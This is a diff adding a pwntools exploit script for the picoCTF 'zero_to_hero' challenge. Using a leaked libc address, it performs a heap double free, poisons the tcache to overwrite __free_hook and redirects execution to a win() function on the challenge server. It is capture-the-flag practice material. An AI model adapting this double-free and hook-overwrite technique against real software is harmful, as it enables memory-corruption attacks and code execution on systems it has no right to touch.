@@ -1,0 +1,99 @@
+# This is the full exploit
+from pwn import *
+import time
+
+# p = process('./zero_to_hero', env={"LD_PRELOAD": "libc.so.6"})
+p = remote('jupiter.challenges.picoctf.org',10089)
+
+# Standard helper functions
+def wait():
+    time.sleep(0.15)
+def flush():
+    # Use p.recvall() or p.recv(timeout=...) in more robust scripts,
+    # but for a quick flush, this is common.
+    return p.recv(4096)
+
+def create(s, l):
+    # The first sendline is for the menu choice '1'
+    p.sendline('1')
+    p.sendline(str(l))
+    p.sendline(s)
+    wait()
+def remove(n):
+    # The first sendline is for the menu choice '2'
+    p.sendline('2')
+    p.sendline(str(n))
+    wait()
+
+p.sendline('yes')
+wait()
+
+# FIX: Use p.recvuntil() to reliably read the entire initial output,
+# including the SYSTEM address leak, up to the start of the menu prompt.
+try:
+    # Wait up to 2 seconds for the full menu/leak, assuming '2. Remove' is the end marker
+    data = p.recvuntil(b'2. Remove', timeout=2) 
+except EOFError:
+    print("Error: Connection closed unexpectedly while reading leak data.")
+    print("Data received so far:\n", data.decode('latin-1'))
+    p.close()
+    exit()
+
+# print data --- they give libc for free
+# The splitting logic assumes the leak line is exactly the 5th line (index 4).
+try:
+    SYSTEM = int(data.split(b'\n')[4][39:], 16) # Added 'b' for split to handle bytes
+except IndexError:
+    print("Error: Could not parse SYSTEM address. Received data was likely malformed.")
+    print("Full received data:\n", data.decode('latin-1'))
+    p.close()
+    exit()
+
+LIBC_BASE = SYSTEM - 0x2C550
+MALLOC_HOOK = LIBC_BASE + 0x72380
+
+# at 0x1e3ef8 in file
+FREE_HOOK = LIBC_BASE + 0x1C0B28
+# FIX: Changed print statement to a print function call
+print("== LEAKED LIBC: {} ==".format(hex(LIBC_BASE)))
+
+input("[begin exploit]")
+
+input("[malloc chunk A, size 0x30]")
+create(b"AAAA", 40) # Changed strings to bytes for pwn functions
+input("[malloc chunk B, size 0x110]")
+create(b"BBBB", 264) # Changed strings to bytes for pwn functions
+
+input("[free chunk B]")
+remove(1)
+
+input("[free chunk A; we will get it later so we can write to it again]")
+remove(0)
+input("[malloc (again) chunk A with len = 40; overwrite chunk B]")
+create(b"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj", 40) # Changed strings to bytes
+
+input("[free chunk B again (double free)]")
+remove(1)
+
+# Read the subsequent menu prompt after double-freeing
+try:
+    p.recvuntil(b'2. Remove', timeout=2)
+except:
+    pass # Continue even if no full menu is received
+
+input("[malloc chunk of size 0x100]")
+# We are creating a chunk of size 0x100 (256 in decimal, so 248 payload + size + metadata)
+# You specified 248 as the length, which likely refers to the payload size.
+create(p64(FREE_HOOK), 248) 
+
+input("[malloc the same chunk of size 0x110]")
+create(b"1111222233334444", 264) # Changed strings to bytes
+
+input("[malloc for arbitrary write]")
+# 0x400a02 is the location of win()
+create(p64(0x400a02), 264)
+
+input("[win]")
+remove(0)
+
+p.interactive()
